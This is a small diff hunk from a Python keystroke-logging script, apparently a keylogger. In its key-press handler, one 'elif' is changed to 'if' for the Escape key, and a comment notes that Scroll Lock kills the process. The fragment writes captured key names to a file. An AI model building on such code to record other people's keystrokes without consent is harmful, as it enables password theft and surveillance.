@@ -44,7 +44,7 @@ def on_press(key):
                 pass
         elif key == keyboard.Key.alt or keyboard.Key.alt_gr or keyboard.Key.alt_l or keyboard.Key.alt_r:
             file1.write(' (alt) ')
-        elif key == keyboard.Key.esc:
+        if key == keyboard.Key.esc:
             file1.write(' (esc) ')
         elif key == keyboard.Key.scroll_lock:
             # Scroll lock is set to kill the process (Used mainly for testing/debugging purposes) (Plus no one uses it)
